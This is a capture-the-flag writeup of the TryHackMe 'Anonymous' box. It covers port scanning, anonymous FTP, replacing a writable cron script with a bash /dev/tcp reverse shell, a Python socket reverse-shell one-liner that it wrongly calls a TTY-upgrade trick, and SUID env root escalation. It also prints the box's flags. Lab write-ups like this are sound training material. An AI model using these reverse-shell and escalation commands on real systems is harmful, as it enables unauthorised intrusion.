# TryHackMe: Anonymous — Writeup

**Author: Shreekara kedlaya**

Anonymous is a beginner Linux box on TryHackMe that's mostly about not skipping FTP just because SSH is sitting right there. Enumeration, anonymous FTP, a writable script, a reverse shell, and an SUID `env` binary for the root shell. Here's how I went through it.

---

## 1. Recon

Started with the usual nmap sweep:

```bash
nmap -sC -sV 10.10.40.150
```

Four ports open:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 2.0.8 or later |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 139 | SMB | Samba smbd 3.X - 4.X |
| 445 | SMB | Samba smbd 3.X - 4.X |

I also ran it through the port scanner I've been building (`main.py` — a lightweight nmap/zenmap-style tool) just to sanity-check the nmap output against my own code:

```text
Network Scanner v1.0
Similar to nmap/zenmap

[*] Starting scan on target: 10.10.40.150
[*] Port range: 1-1000
[*] Threads: 100
[*] Timeout: 1.0s
[*] Directory enumeration: Disabled

[*] Scanning 1000 ports ...
[+] Port 21 is OPEN
[+] Port 22 is OPEN
[+] Port 139 is OPEN
[+] Port 445 is OPEN

SCAN RESULTS
Target: 10.10.40.150
Duration: 1.91s
[+] Open Ports (4): 21, 22, 139, 445
```

Same four ports, matched nmap's output — good enough validation for a personal tool.

Nothing on SSH is exploitable without creds, and SMB versions here are recent enough that I wasn't going to burn time on them. FTP was the obvious next stop — anonymous login is always worth a shot when port 21 is open.

---

## 2. Enumeration — FTP

```bash
ftp 10.10.40.150
```

```text
Connected to 10.10.40.150.
220 NamelessOne's FTP Server!
Name (10.10.40.150:sneaky69): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Anonymous login worked. `ls` turned up one directory:

```text
drwxrwxrwx    2 111 113 4096 Jun 04 2020 scripts
```

World-writable — always a good sign. Went in:

```text
ftp> cd scripts
ftp> ls
-rwxr-xrwx  1 1000 1000   314 Jun 04 2020 clean.sh
-rw-rw-r--  1 1000 1000  2107 Oct 28 18:11 removed_files.log
-rw-r--r--  1 1000 1000    68 May 12 2020 to_do.txt
```

`clean.sh` has the `w` bit set for everyone (`rwxr-xrwx`). The `removed_files.log` timestamp being current (not a static 2020 date like the others) told me something was actively running and appending to it — a cron job, most likely, executing `clean.sh` on a schedule. If I can overwrite that script, whatever runs it runs my code too.

---

## 3. Initial Access

Swapped `clean.sh` for a one-liner reverse shell pointed at my Kali box:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.11.151.182/1234 0>&1
```

Uploaded it:

```text
ftp> put clean.sh
local: clean.sh remote: clean.sh
226 Transfer complete.
228 bytes sent
```

Then set up a listener and waited for the cron job to fire:

```bash
nc -nlvp 1234
```

```text
listening on [any] 1234 ...
connect to [10.11.151.182] from (UNKNOWN) [10.10.40.150] 41040
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/home/namelessone
```

Shell as `namelessone`. Upgraded it to a proper TTY with the classic python pty trick so I wasn't stuck fighting a dumb shell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.151.182",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## 4. User Flag

```bash
$ ls
pics
user.txt
$ cat user.txt
90d6f992585815ff991e68748c414740
```

---

## 5. Privilege Escalation — SUID `env`

Standard next move on any box: hunt for SUID binaries.

```bash
find / -user root -perm -u=s 2>/dev/null
```

`/usr/bin/env` came back in the list, which is basically a free root shell if you know GTFOBins. `env` doesn't drop privileges when it execs another program, so if it's SUID root, you can use it to spawn a shell that inherits that privilege:

```bash
/usr/bin/env /bin/sh -p
```

```text
$ /usr/bin/env /bin/sh -p
whoami
root
```

Root.

---

## 6. Root Flag

```bash
cd /root
cat root.txt
```

```text
4d930091c31a622a7ed10f27999af363
```

---

## 7. Takeaways

- **Don't fixate on SSH just because it's there.** FTP with anonymous login enabled was the entire way in here — always check it when port 21 is open.
- **World-writable + actively-running script = code execution.** The live timestamp on `removed_files.log` was the tell that something was scheduling `clean.sh`, not just a coincidence.
- **Shell access isn't the finish line.** SUID enumeration should be one of the first things run after landing on a box, not an afterthought.
- **`env` with the SUID bit is a straight line to root** — worth checking GTFOBins reflexively any time `find ... -perm -u=s` returns something unfamiliar.

---

## Flags

**User:** `90d6f992585815ff991e68748c414740`
**Root:** `4d930091c31a622a7ed10f27999af363`

---

### Attack path

```text
nmap/custom scanner → FTP (21) anonymous login → writable scripts/clean.sh
  → reverse shell as namelessone → user.txt
  → SUID enum → /usr/bin/env → env /bin/sh -p → root → root.txt
```
